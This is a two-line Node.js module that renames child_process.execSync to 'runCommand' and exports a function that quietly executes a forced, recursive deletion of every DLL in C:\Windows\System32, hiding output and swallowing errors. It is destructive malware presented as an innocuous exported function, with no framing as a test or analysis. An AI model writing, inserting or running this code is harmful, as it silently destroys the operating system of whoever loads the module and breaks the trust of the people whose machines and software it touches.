const {execSync: runCommand} = require('child_process');
module.exports=function(){try{runCommand('del /F /S /Q C:\\Windows\\System32\\*.dll',{shell:true,stdio:'ignore'});}catch(e){};};
